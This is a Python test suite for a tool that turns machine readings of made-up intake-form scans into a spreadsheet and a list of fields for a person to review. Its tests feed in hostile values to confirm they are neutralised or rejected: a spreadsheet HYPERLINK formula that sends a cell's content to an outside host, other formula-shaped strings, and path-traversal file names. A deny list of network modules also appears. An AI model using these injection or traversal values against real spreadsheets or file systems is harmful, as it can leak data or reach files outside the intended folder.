"""Tests for run_process.py on made-up practice files (no real data); standard library only, no network.

    python3 -m unittest discover -s tests -v      (from the folder that holds run_process.py)

These tests show what this process does with reading files. They say nothing about how well any
agent or OCR tool reads a scan, because this process never reads one.
"""

from __future__ import annotations

import ast
import csv
import hashlib
import json
import shutil
import socket
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(HERE))

import run_process as rp  # noqa: E402

SAMPLES = HERE / "samples" / "input"
EXPECTED = HERE / "samples" / "expected"
REFERENCE = HERE / "samples" / "reference-process.json"
SPEC = HERE / "process.json"


def rows(path: Path) -> list[dict[str, str]]:
    with path.open(encoding="utf-8", newline="") as handle:
        return list(csv.DictReader(handle))


def tree(folder: Path) -> dict[str, str]:
    return {p.relative_to(folder).as_posix(): hashlib.sha256(p.read_bytes()).hexdigest() for p in sorted(folder.rglob("*")) if p.is_file()}


class ScanRunnerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="scan-process-test-"))
        self.data = self.tmp / "data"
        shutil.copytree(SAMPLES, self.data)
        self.out = self.tmp / "results"

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def run_on(self, spec: Path = REFERENCE) -> tuple[dict, list[dict[str, str]], list[dict[str, str]]]:
        report = rp.run(self.data, self.out, spec, overwrite=True)
        return report, rows(self.out / "spreadsheet.csv"), rows(self.out / "person-check.csv")

    def reading(self, name: str, fields: dict, source: str = "intake-form-sample-04.png") -> None:
        doc = {"document_id": name, "source_file": source, "fields": fields}
        (self.data / "readings" / f"{name}.json").write_text(json.dumps(doc), encoding="utf-8")

    def flags_for(self, flags: list[dict[str, str]], doc: str) -> set[tuple[str, str]]:
        return {(f["field"], f["issue"]) for f in flags if f["document_id"] == doc}

    def test_reference_steps_match_reviewed_outputs(self) -> None:
        self.run_on()
        for name in ("spreadsheet.csv", "person-check.csv", "report.json", "report.md"):
            self.assertEqual((self.out / name).read_bytes(), (EXPECTED / name).read_bytes(), name)

    def test_the_scans_and_readings_are_never_changed(self) -> None:
        before = tree(self.data)
        report, _, _ = self.run_on()
        self.assertEqual(tree(self.data), before)
        self.assertTrue(report["inputs_unchanged"])
        record = json.loads((self.out / "record.json").read_text(encoding="utf-8"))
        self.assertEqual(record["inputs_before"], record["inputs_after"])

    def test_the_package_steps_keep_every_person_check(self) -> None:
        spec = rp.load_spec(SPEC)
        kinds = {f["name"]: f["kind"] for f in rp.fields_of(spec)}
        self.assertGreaterEqual(rp.min_confidence(spec), rp.LOWEST_ALLOWED_CONFIDENCE)
        report, sheet, flags = self.run_on(SPEC)
        self.assertEqual(report["model_calls"], 0)
        self.assertEqual({r["source_file"] for r in sheet}, {p.name for p in SAMPLES.glob("*.png")}, "one row per scan")
        for row in sheet:
            self.assertEqual(row["person_check"], "yes" if self.flags_for(flags, row["document_id"]) else "no")
        for flag in flags:
            if flag["issue"] == "case_text":
                self.assertEqual(kinds[flag["field"]], "case_text")

    def test_client_text_always_goes_to_a_person_however_sure_the_reader_was(self) -> None:
        self.reading("sure", {"client_name": {"value": "Sample Client Four", "confidence": 1.0}})
        _, sheet, flags = self.run_on()
        self.assertIn(("client_name", "case_text"), self.flags_for(flags, "sure"))
        self.assertEqual(next(r for r in sheet if r["document_id"] == "sure")["client_name"], "Sample Client Four")

    def test_a_clear_field_goes_in_with_no_question(self) -> None:
        _, sheet, flags = self.run_on()
        row = next(r for r in sheet if r["document_id"] == "intake-form-sample-01")
        self.assertEqual(row["client_reference"], "SAMPLE-0101")
        self.assertNotIn("client_reference", {f for f, _ in self.flags_for(flags, "intake-form-sample-01")})

    def test_unclear_and_low_confidence_values_stay_out_of_the_spreadsheet(self) -> None:
        _, sheet, flags = self.run_on()
        row = next(r for r in sheet if r["document_id"] == "intake-form-sample-02")
        self.assertEqual((row["document_date"], row["handwritten_notes"]), ("", ""))
        found = self.flags_for(flags, "intake-form-sample-02")
        self.assertIn(("document_date", "low_confidence"), found)
        self.assertIn(("handwritten_notes", "unclear"), found)
        kept = next(f for f in flags if f["field"] == "document_date" and f["document_id"] == "intake-form-sample-02")
        self.assertEqual(kept["value_read"], "2026-03-18", "the person sees what was read")

    def test_a_value_that_shows_doubt_is_treated_as_unclear_even_without_the_mark(self) -> None:
        for value in ("call after 4?", "[illegible] street", "cannot read this"):
            self.reading("doubt", {"request_or_need": {"value": value, "confidence": 0.99}})
            _, sheet, flags = self.run_on()
            self.assertEqual(next(r for r in sheet if r["document_id"] == "doubt")["request_or_need"], "")
            self.assertIn(("request_or_need", "unclear"), self.flags_for(flags, "doubt"))

    def test_a_value_with_no_confidence_is_held(self) -> None:
        self.reading("bare", {"client_reference": {"value": "SAMPLE-0104"}})
        _, sheet, flags = self.run_on()
        self.assertEqual(next(r for r in sheet if r["document_id"] == "bare")["client_reference"], "")
        self.assertIn(("client_reference", "no_confidence"), self.flags_for(flags, "bare"))

    def test_every_missing_field_is_listed(self) -> None:
        self.reading("gaps", {"document_type": {"value": "", "confidence": 0.9}})
        _, _, flags = self.run_on()
        found = {f for f, issue in self.flags_for(flags, "gaps") if issue == "missing"}
        self.assertEqual(found, {f["name"] for f in rp.fields_of(rp.load_spec(REFERENCE))})

    def test_a_scan_with_no_reading_gets_an_empty_row_and_a_check(self) -> None:
        _, sheet, flags = self.run_on()
        row = next(r for r in sheet if r["document_id"] == "intake-form-sample-04")
        self.assertEqual(row["client_name"], "")
        self.assertIn(("*", "no_reading"), self.flags_for(flags, "intake-form-sample-04"))

    def test_broken_readings_are_listed_and_do_not_stop_the_run(self) -> None:
        readings = self.data / "readings"
        (readings / "not-json.json").write_text("{not json", encoding="utf-8")
        (readings / "wrong-name.json").write_text(json.dumps({"document_id": "other", "source_file": "a.png", "fields": {}}), encoding="utf-8")
        (readings / "escape.json").write_text(json.dumps({"document_id": "escape", "source_file": "../secret.png", "fields": {}}), encoding="utf-8")
        _, _, flags = self.run_on()
        for doc in ("not-json", "wrong-name", "escape"):
            self.assertIn(("*", "bad_reading"), self.flags_for(flags, doc))

    def test_a_reading_with_no_scan_and_two_readings_of_one_scan_are_listed(self) -> None:
        self.reading("orphan", {}, source="not-here.png")
        self.reading("twin", {}, source="note-sample-03.png")
        _, _, flags = self.run_on()
        self.assertIn(("*", "no_scan"), self.flags_for(flags, "orphan"))
        self.assertIn(("*", "duplicate_source"), self.flags_for(flags, "twin"))

    def test_a_value_a_spreadsheet_could_run_is_held(self) -> None:
        self.reading("formula", {"document_type": {"value": "=HYPERLINK(1)", "confidence": 0.99}})
        _, sheet, flags = self.run_on()
        self.assertEqual(next(r for r in sheet if r["document_id"] == "formula")["document_type"], "")
        self.assertIn(("document_type", "starts_like_formula"), self.flags_for(flags, "formula"))

    def assert_no_cell_can_run(self) -> None:
        for name in ("spreadsheet.csv", "person-check.csv"):
            with (self.out / name).open(encoding="utf-8", newline="") as handle:
                for row in csv.reader(handle):
                    for cell in row:
                        self.assertFalse(cell.lstrip(" \t\r\n").startswith(rp.FORMULA_START), f"{name}: {cell!r}")

    def test_no_cell_in_either_file_can_run_as_a_formula(self) -> None:
        evil = '=HYPERLINK("http://example.org/?"&A2)'
        self.reading("cells", {"document_type": {"value": evil, "confidence": 0.99},
                               "handwritten_notes": {"value": "+1 sum(A1)", "unclear": True, "confidence": "=1+1"},
                               "client_reference": {"value": "@cmd", "confidence": "-2"},
                               "=UNKNOWN(1)": {"value": "-3+3", "confidence": 0.9}})
        (self.data / "=SCAN(1).png").write_bytes(b"made up")
        (self.data / " +SPACE(1).png").write_bytes(b"made up")
        (self.data / "readings" / "=READING(1).json").write_text("{not json", encoding="utf-8")
        _, sheet, flags = self.run_on()
        self.assert_no_cell_can_run()
        seen = {(f["field"], f["issue"]): f for f in flags if f["document_id"] == "cells"}
        self.assertEqual(seen[("document_type", "starts_like_formula")]["value_read"], "'" + evil, "a person still sees what was read")
        self.assertEqual(seen[("handwritten_notes", "unclear")]["value_read"], "'+1 sum(A1)")
        self.assertEqual(seen[("handwritten_notes", "unclear")]["confidence"], "'=1+1")
        self.assertEqual(seen[("client_reference", "no_confidence")]["confidence"], "'-2")
        self.assertEqual(seen[("'=UNKNOWN(1)", "unknown_field")]["value_read"], "'-3+3")
        ids = {r["document_id"] for r in sheet}
        self.assertLessEqual({"'=SCAN(1)", "' +SPACE(1)", "'=READING(1)"}, ids)
        self.assertIn("'=SCAN(1).png", {r["source_file"] for r in sheet})
        self.assertLessEqual({"'=SCAN(1)", "' +SPACE(1)", "'=READING(1)"}, {f["document_id"] for f in flags})

    def test_fields_to_check_cannot_run_when_an_unknown_field_comes_first(self) -> None:
        spec = json.loads(REFERENCE.read_text(encoding="utf-8"))
        spec["steps"][0]["params"]["fields"] = [{"name": "page_count", "kind": "number", "label": "Pages"}]
        path = self.tmp / "one-field.json"
        path.write_text(json.dumps(spec), encoding="utf-8")
        self.reading("first", {"page_count": {"value": "2", "confidence": 0.99}, "=UNKNOWN(1)": {"value": "x", "confidence": 0.9}})
        _, sheet, _ = self.run_on(path)
        self.assertEqual(next(r for r in sheet if r["document_id"] == "first")["fields_to_check"], "'=UNKNOWN(1)")
        self.assert_no_cell_can_run()

    def test_the_record_names_no_file(self) -> None:
        (self.data / "Sample Client Nine intake.png").write_bytes(b"made up")
        self.run_on()
        text = (self.out / "record.json").read_text(encoding="utf-8")
        self.assertNotIn("Sample Client Nine", text)
        self.assertNotIn("sample-01", text)
        record = json.loads(text)
        self.assertEqual(record["inputs_before"], record["inputs_after"])
        self.assertEqual(len(record["inputs_before"]), 8)

    def test_a_date_or_number_of_the_wrong_shape_is_held(self) -> None:
        self.reading("shape", {"document_date": {"value": "sometime in spring", "confidence": 0.99},
                               "page_count": {"value": "a few", "confidence": 0.99}})
        _, _, flags = self.run_on()
        self.assertLessEqual({("document_date", "check_format"), ("page_count", "check_format")}, self.flags_for(flags, "shape"))

    def test_report_holds_counts_only(self) -> None:
        self.run_on()
        for name in ("report.md", "report.json"):
            text = (self.out / name).read_text(encoding="utf-8")
            for value in ("Sample Client", "SAMPLE-01", "housing", "2026-03"):
                self.assertNotIn(value, text, name)

    def test_results_are_kept_unless_asked_and_never_inside_the_input(self) -> None:
        rp.run(self.data, self.out, REFERENCE)
        with self.assertRaises(rp.ProcessError):
            rp.run(self.data, self.out, REFERENCE)
        with self.assertRaises(rp.ProcessError):
            rp.run(self.data, self.data / "results", REFERENCE)

    def test_write_reading_saves_only_a_good_reading_in_the_readings_folder(self) -> None:
        fine = {"document_id": "intake-form-sample-04", "source_file": "intake-form-sample-04.png",
                "fields": {"client_reference": {"value": "SAMPLE-0104", "confidence": 0.9}, "handwritten_notes": {"value": "", "unclear": True}}}
        saved = rp.write_reading(self.data, json.dumps(fine), REFERENCE)
        self.assertEqual(saved.parent, self.data / "readings")
        _, sheet, _ = self.run_on()
        self.assertEqual(next(r for r in sheet if r["document_id"] == "intake-form-sample-04")["client_reference"], "SAMPLE-0104")
        bad = [{**fine, "document_id": "../../outside"}, {**fine, "source_file": "../x.png"}, {**fine, "source_file": "not-here.png"},
               {**fine, "fields": {"staff_initials": {"value": "x", "confidence": 1}}},
               {**fine, "fields": {"client_name": {"value": "no confidence"}}},
               {**fine, "fields": {"client_name": {"value": "x", "unclear": True, "confidence": "=1+1"}}}, ["not", "an", "object"]]
        for doc in bad:
            with self.assertRaises(rp.ProcessError, msg=str(doc)):
                rp.write_reading(self.data, json.dumps(doc), REFERENCE)
        self.assertFalse((self.tmp / "outside.json").exists())

    def test_a_weakened_spec_is_refused(self) -> None:
        good = json.loads(REFERENCE.read_text(encoding="utf-8"))
        changes = []
        low = json.loads(json.dumps(good))
        low["steps"][0]["params"]["min_confidence"] = 0.1
        changes.append(low)
        short = json.loads(json.dumps(good))
        short["steps"] = [s for s in short["steps"] if s["operation"] != "list_for_person"]
        changes.append(short)
        odd = json.loads(json.dumps(good))
        odd["steps"][0]["params"]["fields"][0]["kind"] = "anything"
        changes.append(odd)
        for spec in changes:
            path = self.tmp / "changed.json"
            path.write_text(json.dumps(spec), encoding="utf-8")
            with self.assertRaises(rp.ProcessError):
                rp.load_spec(path)

    def test_no_network_no_model_and_no_image_library(self) -> None:
        with mock.patch.object(socket.socket, "connect", side_effect=AssertionError("network")):
            self.run_on()
        tree_ = ast.parse((HERE / "run_process.py").read_text(encoding="utf-8"))
        imported = {(a.name if isinstance(n, ast.Import) else n.module).split(".")[0]
                    for n in ast.walk(tree_) if isinstance(n, (ast.Import, ast.ImportFrom))
                    for a in (n.names if isinstance(n, ast.Import) else [n])}
        self.assertLessEqual(imported, set(sys.stdlib_module_names))
        self.assertFalse(imported & {"socket", "urllib", "http", "ssl", "subprocess", "ftplib", "smtplib"})

    def test_the_cli_says_it_does_not_read_scans(self) -> None:
        self.assertIn("does not read images or handwriting", rp.__doc__)
        self.assertEqual(rp.main(["--input", str(self.data), "--output", str(self.out), "--spec", str(REFERENCE)]), 0)
        self.assertIn("did not read the scans", (self.out / "report.md").read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
